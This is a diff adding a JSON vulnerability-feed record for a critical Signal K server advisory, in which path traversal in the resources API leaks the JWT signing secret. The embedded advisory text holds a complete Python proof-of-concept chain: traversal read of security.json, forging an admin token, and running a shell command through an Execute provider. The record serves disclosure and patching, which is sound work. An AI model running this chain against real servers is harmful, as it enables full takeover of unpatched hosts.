@@ -1,0 +1,157 @@
+{
+ "affected": [
+  {
+   "ecosystem": "npm",
+   "package": "signalk-server",
+   "ranges": [
+    {
+     "fixed": "2.34.0",
+     "introduced": "2.0.0"
+    }
+   ]
+  },
+  {
+   "ecosystem": "npm",
+   "package": "@signalk/resources-provider",
+   "ranges": [
+    {
+     "fixed": "1.5.3",
+     "introduced": "1.0.0"
+    }
+   ]
+  }
+ ],
+ "aliases": [],
+ "bundles": [],
+ "context": {
+  "attacker": {
+   "access": "network",
+   "login": "none",
+   "nonDefaultSetup": true,
+   "userAction": false
+  },
+  "conditions": [
+   {
+    "quote": "All current signalk-server releases and all published versions of the bundled/standalone resources-provider are affected.",
+    "sourceUrl": "https://github.com/SignalK/signalk-server/security/advisories/GHSA-4xm8-rg9h-jhq2",
+    "text": "Affected: @signalk/resources-provider 1.0.0 through 1.5.2, and signalk-server 2.0.0 and later (patched in 2.34.0)."
+   },
+   {
+    "quote": "deployments with allow_readonly=true",
+    "sourceUrl": "https://github.com/SignalK/signalk-server/security/advisories/GHSA-4xm8-rg9h-jhq2",
+    "text": "The unauthenticated attack path requires the server to be configured with allow_readonly=true."
+   },
+   {
+    "quote": "succeeds with any readonly user token",
+    "sourceUrl": "https://github.com/SignalK/signalk-server/security/advisories/GHSA-4xm8-rg9h-jhq2",
+    "text": "On default deployments (allow_readonly=false), the attack needs a valid readonly user token."
+   }
+  ],
+  "conflicts": [],
+  "faq": [
+   {
+    "answer": "A path traversal flaw in the Signal K resources API can let a remote client read arbitrary JSON files on the server. That includes the JWT signing secret, which can be used to forge admin tokens and enable remote code execution.",
+    "key": "meaning",
+    "sources": [
+     "https://github.com/SignalK/signalk-server/security/advisories/GHSA-4xm8-rg9h-jhq2"
+    ]
+   },
+   {
+    "answer": "signalk-server from 2.0.0 up to, but not including, 2.34.0, and @signalk/resources-provider from 1.0.0 through 1.5.2. The unauthenticated path requires allow_readonly=true in the server configuration. On default deployments (allow_readonly=false), an attack needs a valid readonly user token.",
+    "key": "affected",
+    "sources": [
+     "https://github.com/SignalK/signalk-server/security/advisories/GHSA-4xm8-rg9h-jhq2"
+    ]
+   },
+   {
+    "answer": "Upgrade signalk-server to 2.34.0 or later, and @signalk/resources-provider to 1.5.3 or later.",
+    "key": "action",
+    "sources": [
+     "https://github.com/SignalK/signalk-server/security/advisories/GHSA-4xm8-rg9h-jhq2"
+    ]
+   }
+  ],
+  "fix": {
+   "partial": false,
+   "quote": "Patched versions\n1.5.3",
+   "sourceUrl": "https://github.com/SignalK/signalk-server/security/advisories/GHSA-4xm8-rg9h-jhq2",
+   "versions": [
+    "1.5.3"
+   ],
+   "workaround": null
+  },
+  "generatedAt": "2026-10-31T04:41:37.070Z",
+  "impact": {
+   "quote": "enabling admin token forgery and remote code execution",
+   "sourceUrl": "https://github.com/SignalK/signalk-server/security/advisories/GHSA-4xm8-rg9h-jhq2",
+   "text": "An attacker can read arbitrary JSON files on the server, including the JWT signing secret, which enables admin token forgery and remote code execution."
+  },
+  "inputsHash": "83c34b3b3139a71d",
+  "model": "anthropic/claude-haiku-5.5",
+  "promptVersion": "v2",
+  "sentence": "signalk-server 2.0.0 and later, and @signalk/resources-provider 1.0.0 through 1.5.2, are affected. Fixed in signalk-server 2.34.0 and @signalk/resources-provider 1.5.3.",
+  "vendorSeverity": null
+ },
+ "earlyWarning": [],
+ "exploitation": {
+  "epssReached": null,
+  "exploitDb": null,
+  "githubPoc": null,
+  "kev": null,
+  "metasploit": null,
+  "nuclei": null
+ },
+ "exposure": "Specific setups only",
+ "feedId": "GHSA-4XM8-RG9H-JHQ2",
+ "firstSeenAt": "2026-10-30T23:23:34.449Z",
+ "id": "GHSA-4XM8-RG9H-JHQ2",
+ "modifiedAt": "2026-10-30T23:15:08.283229603Z",
+ "originalDescription": "### Summary\n\nPath traversal in the Signal K resources and applicationData APIs lets an\nunauthenticated or low-privileged user read, write and delete files outside\nthe storage root. Reading <config>/security.json discloses the JWT signing\nsecret, enabling admin token forgery and remote code execution. \n\n### Details\n\n## Description\n\nThe v2 REST resources API `GET /signalk/v2/api/resources/:resourceType/:resourceId` passes `resourceId` to `FileStore.getResource()` without validation. `getResource()` builds the file path with `path.join(this.resources[type].path, itemUuid)` followed by `readFile` + `JSON.parse`, so a `%2F`-encoded multi-level traversal (`..%2F..%2F..%2F..%2F`) escapes the resource storage directory and returns any JSON file on the server (source: `src/api/resources/index.ts:559-600`, `packages/resources-provider-plugin/src/filestorage.ts:115-125`).\n\nBecause the JWT signing secret is stored in plaintext in `<config>/security.json` (generated at `src/tokensecurity.ts:271`, persisted via `saveSecurityConfig` at `src/security.ts:377`), an unauthenticated attacker on deployments with `allow_readonly=true` (a supported, UI-toggleable configuration granting anonymous read access) can:\n\n1. **Read `<config>/security.json`** \u2014 disclosing the JWT signing secret (512-hex) and user password hashes.\n2. **Forge an admin JWT** \u2014 HS256-sign `{\"id\":\"admin\"}` with the disclosed secret; accepted by `/skServer/loginStatus` (`userLevel: \"admin\"`) and all admin-protected endpoints (`adminAuthenticationMiddleware`, `src/tokensecurity.ts:593`, applied at `src/tokensecurity.ts:953`).\n3. **Gain remote code execution** \u2014 `POST /skServer/providers` (admin) accepts a provider of type `Execute`; `packages/streams/src/execute.ts:93` executes it via `spawn('sh', ['-c', command])` at creation time. The provider persists to `settings.json` and survives restarts.\n\nOn default deployments (`allow_readonly=false`), step 1 returns 401 to anonymous users but succeeds with any readonly user token.\n\n## Suggested fixes\n\n1. Validate `resourceId` against a strict whitelist (for example, UUID format) in `src/api/resources/index.ts` before any storage call, including PUT/DELETE.\n2. In `FileStore.getResource/setResource/deleteResource`, canonicalise with `path.resolve()` and reject results outside `this.resources[type].path`.\n3. Store the JWT signing secret outside the API-readable config directory, in a dedicated key file with mode 0600.\n4. Consider gating provider types that execute commands (`Execute`) behind an explicit opt-in.\n\n### Proof of concept\n\nFully local testbed. Start the server, enable `allow_readonly=true`, then run:\n\n```python\n#!/usr/bin/env python3\nimport base64, hashlib, hmac, json, time, urllib.request\nBASE = \"http://127.0.0.1:3000\"\nCMD  = \"id > /tmp/sk-pwned\"\n\n# 1) unauthenticated traversal read of security.json\np = \"/signalk/v2/api/resources/notes/..%2F..%2F..%2F..%2Fsecurity.json\"\nsk = json.load(urllib.request.urlopen(BASE + p))[\"secretKey\"]\n\n# 2) forge admin JWT\nb64 = lambda b: base64.urlsafe_b64encode(b).rstrip(b\"=\").decode()\nh = b64(json.dumps({\"alg\":\"HS256\",\"typ\":\"JWT\"}).encode())\nc = b64(json.dumps({\"id\":\"admin\",\"iat\":int(time.time())}).encode())\ntok = h+\".\"+c+\".\"+b64(hmac.new(sk.encode(), (h+\".\"+c).encode(), hashlib.sha256).digest())\nreq = urllib.request.Request(BASE+\"/skServer/loginStatus\", headers={\"Authorization\":\"JWT \"+tok})\nassert json.load(urllib.request.urlopen(req))[\"userLevel\"] == \"admin\"\n\n# 3) add an Execute provider -> spawn('sh','-c',CMD)\nprov = {\"id\":\"poc-rce\",\"enabled\":True,\"logging\":False,\"type\":\"Execute\",\n        \"options\":{\"type\":\"ws\",\"dataType\":\"SignalK\",\"command\":CMD}}\nreq = urllib.request.Request(BASE+\"/skServer/providers\", data=json.dumps(prov).encode(),\n                             headers={\"Authorization\":\"JWT \"+tok,\"Content-Type\":\"application/json\"}, method=\"POST\")\nprint(urllib.request.urlopen(req).read())    # provider created; /tmp/sk-pwned now exists\n```\n\nReproduction verified independently on master `340d5bb6` (Node 22 / macOS), including restart persistence. PoC artifacts are available on request.\n\n### Impact\n\nUnauthenticated access (with `allow_readonly=true`) leads to full compromise of the server process: arbitrary JSON file read, admin takeover, arbitrary command execution with server privileges, and persistent re-execution after restart. All signalk-server releases and all published versions of the bundled/standalone resources-provider prior to 2.34.0 are affected with the patched version as 2.34.0 fix",
+ "publishedAt": "2026-10-30T22:57:22Z",
+ "references": [
+  {
+   "type": "other",
+   "url": "https://github.com/SignalK/signalk-server/security/advisories/GHSA-4xm8-rg9h-jhq2"
+  },
+  {
+   "type": "other",
+   "url": "https://github.com/SignalK/signalk-server/commit/83689f040d7e90280dddc643f44f3e4ce348fbb1"
+  },
+  {
+   "type": "other",
+   "url": "https://github.com/SignalK/signalk-server"
+  },
+  {
+   "type": "other",
+   "url": "https://github.com/SignalK/signalk-server/releases/tag/v2.34.0"
+  }
+ ],
+ "related": [],
+ "severity": null,
+ "sources": [
+  {
+   "firstSeenAt": "2026-10-30T23:23:34.449Z",
+   "license": "CC-BY-4.0",
+   "name": "ghsa",
+   "url": "https://github.com/advisories/GHSA-4xm8-rg9h-jhq2"
+  },
+  {
+   "firstSeenAt": "2026-10-30T23:23:34.449Z",
+   "license": "CC-BY-4.0",
+   "name": "osv",
+   "url": "https://osv.dev/vulnerability/GHSA-4xm8-rg9h-jhq2"
+  }
+ ],
+ "statedSeverity": {
+  "source": "ghsa",
+  "value": "critical"
+ },
+ "status": "published",
+ "summary": {
+  "model": "anthropic/claude-haiku-5.5",
+  "promptVersion": "v1",
+  "text": "The Signal K server's resources API can be abused through path traversal to read, write, and delete files outside its storage directory. An attacker could read the server's JWT signing secret, forge administrator tokens, and potentially run arbitrary commands on the host."
+ },
+ "supersededBy": [],
+ "title": "Signal K resources API path traversal can disclose the JWT signing secret and enable remote code execution"
+}
